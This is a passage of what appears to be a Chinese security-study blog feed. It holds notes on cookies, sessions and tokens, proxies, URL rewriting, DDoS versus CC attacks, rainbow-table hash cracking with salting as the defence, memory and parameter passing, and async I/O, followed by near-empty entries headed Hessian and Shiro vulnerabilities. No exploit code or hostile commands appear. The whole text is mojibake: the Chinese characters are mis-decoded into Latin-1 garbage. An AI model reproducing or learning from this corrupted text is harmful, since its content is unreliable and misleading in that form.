•è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«"><a href="#è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«" class="headerlink" title="è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«"></a>è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«</h1><p><img src="/../images/image-20230518203842099.png" alt="image-20230518203842099"></p><h1 id="token-x2F-cookie-x2F-session"><a href="#token-x2F-cookie-x2F-session" class="headerlink" title="token&#x2F;cookie&#x2F;session"></a>token&#x2F;cookie&#x2F;session</h1><p><a href="https://www.bilibili.com/video/BV1ob4y1Y7Ep">https://www.bilibili.com/video/BV1ob4y1Y7Ep</a></p><ol><li><p>cookie</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºhttpæ˜¯æ— çŠ¶æ€åè®®ï¼Œå‡è®¾æˆ‘ä»¥khazçš„èº«ä»½å»è®¿é—®æœåŠ¡å™¨ï¼Œç­‰åˆ°ä¸‹ä¸€æ¬¡æˆ‘å†æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨è¿˜æ˜¯ä¸çŸ¥é“æˆ‘æ˜¯è°ï¼Œæˆ‘ä»éœ€è¦å‘æœåŠ¡å™¨æäº¤æ•°æ®è¯´æ˜æˆ‘æ˜¯khazã€‚è¿™æ ·å°±å¯¼è‡´äº†åœ¨åŒä¸€ä¸ªç½‘ç«™ä¸‹æˆ‘æ¯æ¬¡è®¿é—®ä¸€ä¸ªæœåŠ¡éƒ½éœ€è¦æäº¤ä¸€æ¬¡æ•°æ®ï¼Œå¾ˆéº»çƒ¦ã€‚</p></li><li><p>æœ¬è´¨</p><p>æµè§ˆå™¨å­˜å‚¨æŠ€æœ¯ï¼Œå®ç°æ¯æ¬¡HTTPè¯·æ±‚éƒ½è‡ªåŠ¨æäº¤æ•°æ®ç»™æœåŠ¡å™¨çš„æŠ€æœ¯ã€‚</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨è¿”å›çš„responseä¸­ä¼šæœ‰ä¸€ä¸ªset-cookieå­—æ®µï¼Œå½“æˆ‘ä»¬çš„æµè§ˆå™¨æ¥æ”¶åˆ°responseåï¼Œå°±ä¼šå°†set-cookieä¸­çš„å€¼ä¿å­˜åˆ°cookieä¸­ï¼Œç„¶åæ¯æ¬¡æˆ‘ä»¬ç™»é™†æ—¶æµè§ˆå™¨å°±ä¼šè‡ªåŠ¨åœ¨è¯·æ±‚ä¸­ä¸ºæˆ‘ä»¬å¸¦ä¸Šcookieï¼ŒæœåŠ¡ç«¯æ¥æ”¶åå»æ•°æ®åº“ä¸­æ ¸å®cookieä¿¡æ¯ã€‚</p></li><li><p>å®ä¾‹</p><p>é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¾ˆå¤šç½‘ç«™çš„ç™»å½•ç•Œé¢ä¸­çœ‹åˆ°â€œè¯·è®°ä½æˆ‘â€è¿™æ ·çš„é€‰é¡¹ï¼Œå¦‚æœä½ å‹¾é€‰äº†å®ƒä¹‹åå†ç™»å½•ï¼Œé‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™å°±ä¸éœ€è¦è¿›è¡Œé‡å¤è€Œç¹ççš„ç™»å½•åŠ¨ä½œäº†ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½å°±æ˜¯é€šè¿‡Cookieå®ç°çš„ã€‚</p></li></ul></li><li><p>session</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºcookieæ˜¯ä¿å­˜åœ¨æµè§ˆå™¨ä¸­çš„ï¼Œç”¨æˆ·å¯ä»¥éšæ„æŸ¥çœ‹å’Œä¿®æ”¹å¾ˆä¸å®‰å…¨ã€‚</p></li><li><p>æœ¬è´¨</p><p>ä¸€ç§æ¦‚å¿µã€‚è®©HTTPä»æ— çŠ¶æ€è¿æ¥å˜ä¸ºæœ‰çŠ¶æ€è¿æ¥ï¼ˆä¼šè¯çŠ¶æ€ï¼‰ã€‚</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡ç«¯ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆsessionå¯¹è±¡ç”¨äºä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒæ—¶é€šè¿‡set-cookieå­—æ®µå°†session-idä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚åœ¨ä¼šè¯çš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Šsession-idï¼ŒæœåŠ¡ç«¯æ ¹æ®session-idæ‰¾åˆ°å¯¹åº”çš„sessionï¼Œæ ¸å®ç”¨æˆ·çš„èº«ä»½ã€‚</p><blockquote><p>æ³¨ï¼šä¼šè¯çš„æœ‰æ•ˆæœŸæ˜¯é€šè¿‡è®¾ç½®cookieçš„æœ‰æ•ˆæœŸå®ç°çš„ã€‚</p></blockquote></li></ul></li><li><p>token</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºsessionçš„æœºåˆ¶ï¼ŒæœåŠ¡ç«¯éœ€è¦åœ¨å†…å­˜ä¸­ä¿å­˜sessionï¼Œå°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚ï¼š</p><ul><li>å¤§é‡sessionå¯¹è±¡çš„å­˜å‚¨å¸¦æ¥çš„å†…å­˜æ¶ˆè€—</li><li>å„æœåŠ¡å™¨ä¹‹é—´sessionçš„å¤åˆ¶</li><li>ä¸“é—¨ç”¨äºå­˜å‚¨sessionçš„æœåŠ¡å™¨å®•æœº</li></ul></li><li><p>æœ¬è´¨</p><p>èº«ä»½ä»¤ç‰Œ</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†åï¼ŒæœåŠ¡ç«¯ä¼šç”Ÿæˆä¸€ä¸ªtokenä»¤ç‰Œã€‚é€šè¿‡ set-cookieå­—æ®µä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚</p><p>åœ¨ä»¤ç‰Œçš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Štokenä»¤ç‰Œï¼ŒæœåŠ¡ç«¯é€šè¿‡ä¿å­˜çš„å¯†é’¥éªŒè¯ç­¾åæ¥æ ¸å¯¹ç”¨æˆ·èº«ä»½ã€‚</p></li><li><p>å®ä¾‹</p><p> json web tokenï¼ŒJWT</p><p>æ€»ç»“</p><blockquote><p>cookieï¼š</p><p>å®¢æˆ·ç«¯ä¿å­˜ï¼ŒæœåŠ¡ç«¯ä¸ä¿å­˜ã€‚</p><p>sessionï¼š</p><p>å®¢æˆ·ç«¯åªä¿å­˜session-idï¼ŒæœåŠ¡ç«¯ä¿å­˜sessionå¯¹è±¡ã€‚</p><p>tokenï¼š</p><p>å®¢æˆ·ç«¯ä¿å­˜tokenï¼ŒæœåŠ¡ç«¯åªä¿å­˜tokenç­¾åçš„å¯†é’¥ã€‚</p></blockquote></li></ul></li></ol><h1 id="æ­£å‘-x2F-åå‘ä»£ç†"><a href="#æ­£å‘-x2F-åå‘ä»£ç†" class="headerlink" title="æ­£å‘&#x2F;åå‘ä»£ç†"></a>æ­£å‘&#x2F;åå‘ä»£ç†</h1><p><a href="https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/">https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/</a></p><ul><li><p>æ­£å‘ä»£ç†</p><blockquote><p>è½¬å‘ä»£ç†ï¼Œé€šå¸¸ç§°ä¸ºä»£ç†ã€ä»£ç†æœåŠ¡å™¨æˆ– Web ä»£ç†ï¼Œæ˜¯ä½äºä¸€ç»„å®¢æˆ·ç«¯è®¡ç®—æœºä¹‹å‰çš„æœåŠ¡å™¨,ç¡®ä¿æ²¡æœ‰æºç«™ç›´æ¥ä¸è¯¥ç‰¹å®šå®¢æˆ·ç«¯é€šä¿¡</p></blockquote><p><img src="/../images/forward-proxy-flow.svg" alt="æ­£å‘ä»£ç†æµ"></p></li></ul><p>â€‹        åœ¨æ ‡å‡†çš„äº’è”ç½‘é€šä¿¡ä¸­ï¼Œè®¡ç®—æœº A å°†ç›´æ¥ä¸è®¡ç®—æœº C ä¿æŒè”ç³»ï¼Œå®¢æˆ·ç«¯å°†è¯·æ±‚å‘é€åˆ°<a href="https://www.cloudflare.com/learning/cdn/glossary/origin-server/">æºæœåŠ¡å™¨</a>ï¼Œå¹¶ä¸”æºæœåŠ¡å™¨å°†å“åº”å®¢æˆ·ç«¯ã€‚å½“å­˜åœ¨æ­£å‘&#x2F;è½¬å‘ä»£ç†æ—¶ï¼ŒA å°†è¯·æ±‚å‘é€åˆ° Bï¼ŒB éšåå°†è¯·æ±‚è½¬å‘ç»™ Cã€‚C å°†å‘ B å‘é€å“åº”ï¼Œè€Œ B åˆ™å°†å“åº”è½¬å‘ç»™ Aã€‚</p><ul><li><p>åå‘ä»£ç†</p><blockquote><p>åå‘ä»£ç†æ˜¯ä½äºä¸€ä¸ªæˆ–å¤šä¸ª Web æœåŠ¡å™¨å‰é¢çš„æœåŠ¡å™¨ï¼Œæ‹¦æˆªæ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç¡®ä¿æ²¡æœ‰å®¢æˆ·ç«¯ç›´æ¥ä¸è¯¥æºç«™é€šä¿¡ã€‚</p></blockquote><p><img src="/../images/reverse-proxy-flow.svg" alt="åå‘ä»£ç†æµ"></p></li></ul><p>â€‹       é€šå¸¸ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€åˆ° Fï¼Œè€Œ F ä¼šç›´æ¥å°†å“åº”å‘é€åˆ° Dã€‚ä½¿ç”¨åå‘ä»£ç†ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€ç»™ Eï¼Œè€Œ E ä¼šå°†å…¶è¯·æ±‚å‘é€åˆ° F å¹¶ä» F æ¥æ”¶å“åº”ï¼Œç„¶åå°†é€‚å½“å“åº”ä¼ é€’ç»™ Dã€‚</p><table><thead><tr><th align="left"></th><th>å¯¹è±¡</th><th>ä¼˜ç‚¹</th></tr></thead><tbody><tr><td align="left">æ­£å‘&#x2F;è½¬å‘ä»£ç†</td><td>å®¢æˆ·ç«¯</td><td>åŒ¿åï¼Œç»•è¿‡è®¿é—®é™åˆ¶</td></tr><tr><td align="left">åå‘ä»£ç†</td><td>æœåŠ¡ç«¯</td><td>æ›´åŠ å®‰å…¨ï¼Œæé«˜æœåŠ¡å™¨æ€§èƒ½</td></tr></tbody></table><h1 id="é™æ€webå’ŒåŠ¨æ€web"><a href="#é™æ€webå’ŒåŠ¨æ€web" class="headerlink" title="é™æ€webå’ŒåŠ¨æ€web"></a>é™æ€webå’ŒåŠ¨æ€web</h1><p><a href="https://help.dedecms.com/shiyongshouce/moshi/mingci.html">https://help.dedecms.com/shiyongshouce/moshi/mingci.html</a></p><p>ä¼ªé™æ€å³æ˜¯ç½‘ç«™æœ¬èº«æ˜¯åŠ¨æ€ç½‘é¡µå¦‚.phpã€.aspã€.aspxç­‰æ ¼å¼åŠ¨æ€ç½‘é¡µæœ‰æ—¶è¿™ç±»åŠ¨æ€ç½‘é¡µè¿˜è·Ÿâ€?â€åŠ å‚æ•°æ¥è¯»å–æ•°æ®åº“å†…ä¸åŒèµ„æ–™ï¼Œä¼ªé™æ€å°±æ˜¯åšurlé‡å†™æ“ä½œ(å³rewrite)ã€‚</p><p>demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">è·³è½¬éœ€æ±‚ï¼š</span><br><span class="line">è®¿é—®http:<span class="comment">//www.kevin.com/p/123456.html  è·³è½¬æˆ  http://a.aa.com/p/123456</span></span><br><span class="line"></span><br><span class="line">é…ç½®å¦‚ä¸‹:</span><br><span class="line">rewrite ^/p/(\d+).html    http:<span class="comment">//www.kevin.com/p/$1 last;</span></span><br><span class="line"></span><br><span class="line">è§£é‡Šè¯´æ˜ï¼š</span><br><span class="line">\dæ˜¯æ•°å­—çš„æ„æ€ +æ˜¯æœ€å°‘ä¸€ä¸ª&#123;<span class="number">1</span>,&#125; <span class="number">1</span>åˆ°æ— ç©·å¤§&#123;<span class="number">1</span>,<span class="number">3</span>&#125; è¿™æ ·æ˜¯<span class="number">1</span>-<span class="number">3</span>ä½æ•°ã€‚</span><br></pre></td></tr></table></figure><h1 id="DDOSæ”»å‡»å’ŒCCæ”»å‡»"><a href="#DDOSæ”»å‡»å’ŒCCæ”»å‡»" class="headerlink" title="DDOSæ”»å‡»å’ŒCCæ”»å‡»"></a>DDOSæ”»å‡»å’ŒCCæ”»å‡»</h1><p>DDoSæ”»å‡»æ‰“çš„æ˜¯ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œè€ŒCCæ”»å‡»æ˜¯é’ˆå¯¹ç½‘ç«™çš„é¡µé¢æ”»å‡»çš„ã€‚</p><p>ç”¨æœ¯è¯­æ¥è¯´å°±æ˜¯ï¼Œä¸€ä¸ªæ˜¯WEBç½‘ç»œå±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDDoSï¼‰ï¼Œä¸€ä¸ªæ˜¯WEBåº”ç”¨å±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆCCï¼‰ã€‚</p><p>ç½‘ç»œå±‚å°±æ˜¯åˆ©ç”¨è‚‰é¸¡çš„æµé‡å»æ”»å‡»ç›®æ ‡ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œé’ˆå¯¹æ¯”è¾ƒæœ¬æºçš„ä¸œè¥¿å»æ”»å‡»ï¼ˆé€šä¿¡ä¿¡é“ï¼‰ï¼ŒæœåŠ¡å™¨ç˜«ç—ªäº†ï¼Œé‚£ä¹ˆè¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™è‚¯å®šä¹Ÿä¸èƒ½æ­£å¸¸è®¿é—®äº†ã€‚</p><p>è€Œåº”ç”¨å±‚å°±æ˜¯æˆ‘ä»¬ç”¨æˆ·çœ‹å¾—åˆ°çš„ä¸œè¥¿ï¼Œå°±æ¯”å¦‚è¯´ç½‘é¡µï¼ŒCCæ”»å‡»å°±æ˜¯é’ˆå¯¹ç½‘é¡µæ¥æ”»å‡»çš„ï¼ŒCCæ”»å‡»æœ¬èº«æ˜¯æ­£å¸¸è¯·æ±‚ï¼Œç½‘ç«™åŠ¨æ€é¡µé¢çš„æ­£å¸¸è¯·æ±‚ä¹Ÿä¼šå’Œæ•°æ®åº“è¿›è¡Œäº¤äº’çš„ï¼Œå½“è¿™ç§â€æ­£å¸¸è¯·æ±‚â€è¾¾åˆ°ä¸€ç§ç¨‹åº¦çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨å°±ä¼šå“åº”ä¸è¿‡æ¥ï¼Œä»è€Œå´©æºƒã€‚</p><h1 id="å½©è™¹è¡¨"><a href="#å½©è™¹è¡¨" class="headerlink" title="å½©è™¹è¡¨"></a>å½©è™¹è¡¨</h1><p><a href="https://zhuanlan.zhihu.com/p/105578739">https://zhuanlan.zhihu.com/p/105578739</a></p><p><strong>å½©è™¹è¡¨</strong>(<code>rainbow table</code>)æ˜¯ä¸€ä¸ªç”¨äº<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0">åŠ å¯†æ•£åˆ—å‡½æ•°</a>é€†è¿ç®—çš„é¢„å…ˆè®¡ç®—å¥½çš„<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E6%9F%A5%E6%89%BE%E8%A1%A8">è¡¨</a>ï¼Œå¸¸ç”¨äºç ´è§£åŠ å¯†è¿‡çš„å¯†ç æ•£åˆ—ã€‚å¦‚MD5ï¼ŒSHA1.</p><p> æŸ¥æ‰¾è¡¨å¸¸å¸¸ç”¨äºåŒ…å«æœ‰é™å­—ç¬¦å›ºå®šé•¿åº¦<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E7%BA%AF%E6%96%87%E6%9C%AC">çº¯æ–‡æœ¬</a><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81">å¯†ç </a>çš„åŠ å¯†ã€‚</p><p>äº‹å…ˆå‡†å¤‡å¤§é‡å“ˆå¸Œé“¾è¡¨ï¼š</p><p>Xï¼šéšæœºç”Ÿæˆçš„æ˜æ–‡</p><p>Hï¼šå“ˆå¸Œå‡½æ•°</p><p>Rï¼šè‡ªå®šä¹‰å‡½æ•°</p><p><img src="/../images/image-20220622152607746-1686284457479.png" alt="image-20220622152607746"></p><p>åªä¿å­˜å¼€å¤´å’Œæœ«å°¾ä½ç½®å³Xå’ŒRnã€‚</p><p>å¯¹äºç»è¿‡Hå¾—åˆ°çš„å¯†æ–‡Cè¿›è¡Œç ´è§£ï¼šé¦–å…ˆä½¿ç”¨Rå¾—åˆ°Y&#x3D;Rï¼ˆCï¼‰ï¼Œå†å°†Yä¸Rnè¿›è¡Œæ¯”è¾ƒã€‚</p><p>â‘ å¦‚æœç›¸ç­‰ï¼Œåˆ™è¯´æ˜å¯†æ–‡Cå¯¹åº”çš„æ˜æ–‡Påœ¨å“ˆå¸Œé“¾è¡¨ä¸­çš„Rn-1å¤„ã€‚åŸç†è§ä¸‹å›¾ã€‚</p><p><img src="/../images/image-20220622153058176-1686284457479.png" alt="image-20220622153058176"></p><p>â‘¡å¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™è¯´æ˜å¯†æ–‡Cå¯¹åº”çš„æ˜æ–‡Pä¸åœ¨å“ˆå¸Œé“¾è¡¨ä¸­çš„Rn-1å¤„ã€‚æ‰€ä»¥éœ€è¦å‘å‰æŸ¥æ‰¾æ˜¯å¦åœ¨Rn-2~R1å¤„ã€‚</p><p>å…·ä½“æµç¨‹ï¼šå¯¹Yå†ç”¨Hå’ŒRå‡½æ•°ï¼Œå¾—åˆ°Yâ€˜ï¼Œä¸Rnæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™è¯´æ˜æ˜æ–‡ä¸ºRn-2ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±é‡å¤æ­¥éª¤ï¼Œç›´åˆ°æ‰€æœ‰å“ˆå¸Œé“¾è¡¨éƒ½æŸ¥æ‰¾è¿‡ï¼Œè¯´æ˜ç ´è§£å¤±è´¥ã€‚</p><p>é˜²å¾¡æ‰‹æ®µï¼šåŠ å¯†æ—¶ä½¿ç”¨ç›å€¼</p><h1 id="å †å’Œæ ˆ"><a href="#å †å’Œæ ˆ" class="headerlink" title="å †å’Œæ ˆ"></a>å †å’Œæ ˆ</h1><p><a href="https://cloud.tencent.com/developer/article/1688327">å †å’Œæ ˆçš„åŒºåˆ«</a></p><blockquote><p>æ ˆåŒºä¿å­˜å£°æ˜çš„å˜é‡ä¾‹å¦‚<code>int a=1</code>,ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…</p><p>å †åŒºä¿å­˜ç”¨æˆ·ç”³è¯·çš„å˜é‡ä¾‹å¦‚<code>malloc</code>ï¼Œ<code>b=&amp;a</code></p><p>ç¨‹åºåœ¨ç¼–è¯‘å˜é‡å’Œå¯¹å‡½æ•°åˆ†é…å†…å­˜éƒ½åœ¨æ ˆä¸Šè¿›è¡Œï¼Œä¸”å‡½æ•°è°ƒç”¨æ—¶å‚æ•°çš„ä¼ é€’ä¹Ÿæ˜¯åœ¨æ ˆä¸Šè¿›è¡Œã€‚</p></blockquote><h1 id="æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’"><a href="#æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’" class="headerlink" title="æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’"></a>æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’</h1><p><a href="https://www.junmajinlong.com/coding/pass_by_value_or_ref/">https://www.junmajinlong.com/coding/pass_by_value_or_ref/</a></p><ul><li><p>æŒ‰å€¼ä¼ é€’</p><blockquote><p>å¼€è¾Ÿæ–°ç©ºé—´ï¼Œå°†æ•°æ®å¯¹è±¡æ‹·è´ä¸€ä»½å‰¯æœ¬åˆ°æ–°ç©ºé—´ä¸­</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="built_in">int</span> b=a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027160246647-1686284933113.png" alt="image-20221027160246647"></p><blockquote><p>è¿™æ—¶å€™ä¿®æ”¹aæˆ–bçš„å€¼ï¼Œéƒ½ä¸ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡çš„å€¼</p></blockquote></li><li><p>æŒ‰å¼•ç”¨ä¼ é€’</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b=a;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸å¼€è¾Ÿæ–°ç©ºé—´ï¼Œåªæ˜¯ç»™æ•°æ®å¯¹è±¡æ‰€åœ¨ç©ºé—´åèµ·äº†ä¸€ä¸ªåˆ«å</p></blockquote><p><img src="/../images/image-20221027160357481-1686284933114.png" alt="image-20221027160357481"></p><blockquote><p>è¿™æ—¶å€™ä¿®æ”¹aæˆ–bçš„å€¼ï¼Œåº”è¯¥ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œå› ä¸ºäºŒè€…çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚</p></blockquote></li><li><p>æŒ‰æŒ‡é’ˆä¼ é€’</p><p>åœ¨cæˆ–c++å¯ä»¥æ“ä½œæŒ‡é’ˆçš„è¯­è¨€ä¸­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>* b=&amp;a;</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨å †å†…å­˜ä¸­å¼€è¾Ÿç©ºé—´ç”¨æ¥ä¿å­˜æŒ‡é’ˆbï¼ŒbæŒ‡å‘aæ‰€åœ¨çš„åœ°å€ï¼ˆä¿å­˜açš„åœ°å€ï¼‰ã€‚</p></blockquote><p><img src="/../images/image-20221027160713576-1686284933115.png" alt="image-20221027160713576"></p></li></ul><h1 id="é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥"><a href="#é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥" class="headerlink" title="é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥"></a>é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥</h1><p>æ˜¯node.jsé‡Œç»å¸¸é‡åˆ°çš„è¯æ±‡ï¼Œæˆ‘ä¸¾ä¸ªç®€å•çš„ä¾‹å­æ¥è¯´æ˜ï¼š</p><p>æˆ‘è¦çœ‹è¶³çƒæ¯”èµ›ï¼Œä½†æ˜¯å¦ˆå¦ˆå«æˆ‘çƒ§æ°´ï¼Œç”µè§†æœºåœ¨å®¢å…ï¼Œçƒ§æ°´è¦åœ¨å¨æˆ¿ã€‚å®¶é‡Œæœ‰2ä¸ªæ°´å£¶ï¼Œä¸€ä¸ªæ˜¯æ™®é€šçš„æ°´å£¶ï¼Œå¦ä¸€ä¸ªæ˜¯æ°´å¼€äº†ä¼šå«çš„é‚£ç§æ°´å£¶ã€‚æˆ‘å¯ä»¥ï¼š</p><ol><li>ç”¨æ™®é€šçš„æ°´å£¶çƒ§ï¼Œäººåœ¨è¾¹ä¸Šçœ‹ç€ï¼Œæ°´å¼€äº†å†å»çœ‹çƒã€‚<strong>ï¼ˆåŒæ­¥ï¼Œé˜»å¡ï¼‰</strong>è¿™ä¸ªæ˜¯å¸¸è§„åšæ³•ï¼Œä½†æ˜¯æˆ‘çœ‹çƒä¸çˆ½äº†ã€‚</li><li>ç”¨æ™®é€šæ°´å£¶çƒ§ï¼Œäººå»çœ‹çƒï¼Œéš”å‡ åˆ†é’Ÿå»å¨æˆ¿çœ‹çœ‹ã€‚<strong>ï¼ˆåŒæ­¥ï¼Œéé˜»å¡ï¼‰</strong>è¿™ä¸ªåˆå¤§é—®é¢˜ï¼Œä¸‡ä¸€åœ¨æˆ‘ç¦»å¼€çš„å‡ åˆ†é’Ÿæ°´å¼€äº†ï¼Œæˆ‘å°±éº»çƒ¦äº†ã€‚</li><li>ç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººåœ¨è¾¹ä¸Šçœ‹ç€ã€‚<strong>ï¼ˆå¼‚æ­¥ï¼Œé˜»å¡ï¼‰</strong>è¿™ä¸ªæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æˆ‘å¤ªå‚»äº†ã€‚</li><li>ç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººå»çœ‹çƒï¼Œå¬è§æ°´å£¶å«äº†å†å»çœ‹ã€‚<strong>ï¼ˆå¼‚æ­¥ï¼Œéé˜»å¡ï¼‰</strong>è¿™ä¸ªåº”è¯¥æ˜¯æœ€å¥½çš„ã€‚</li></ol><p>ç­‰ç€çœ‹çƒçš„æˆ‘ï¼šé˜»å¡</p><p>çœ‹ç€ç”µè§†çš„æˆ‘ï¼šéé˜»å¡</p><p>æ™®é€šæ°´å£¶ï¼šåŒæ­¥</p><p>ä¼šå«çš„æ°´å£¶ï¼šå¼‚æ­¥</p><p>æ‰€ä»¥ï¼Œå¼‚æ­¥å¾€å¾€é…åˆéé˜»å¡ï¼Œæ‰èƒ½å‘æŒ¥å‡ºå¨åŠ›ã€‚</p><h1 id="MVCæ¶æ„"><a href="#MVCæ¶æ„" class="headerlink" title="MVCæ¶æ„"></a>MVCæ¶æ„</h1><p><img src="/../images/MVC-1669639280429-1686284933115.png" alt="MVC"></p><h1 id="å°ç«¯åºå’Œå¤§ç«¯åº"><a href="#å°ç«¯åºå’Œå¤§ç«¯åº" class="headerlink" title="å°ç«¯åºå’Œå¤§ç«¯åº"></a>å°ç«¯åºå’Œå¤§ç«¯åº</h1><p><img src="/../images/image-20221209213725351.png" alt="image-20221209213725351"></p><h1 id="CGIä¸fastCGI"><a href="#CGIä¸fastCGI" class="headerlink" title="CGIä¸fastCGI"></a>CGIä¸fastCGI</h1><p><a href="https://www.cnblogs.com/tssc/p/10255590.html#_label4_4">å…³äºCGIå’ŒFastCGIçš„ç†è§£ - å¤©ç”Ÿå¸…æ‰ - åšå®¢å›­</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hessianååºåˆ—åŒ–æ¼æ´</title>
      <link href="/2023/05/01/%E9%98%BF%E9%87%8CNacos/"/>
      <url>/2023/05/01/%E9%98%BF%E9%87%8CNacos/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä½¿ç”¨vulfocusçš„Hessian ååºåˆ—åŒ–</p><h2 id="Fofaè¯­æ³•"><a href="#Fofaè¯­æ³•" class="headerlink" title="Fofaè¯­æ³•"></a>Fofaè¯­æ³•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shiroæ¼æ´</title>
      <link href="/2023/05/01/shiro%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/05/01/shiro%E6%BC%8F%E6%B4%9E/</url>
      
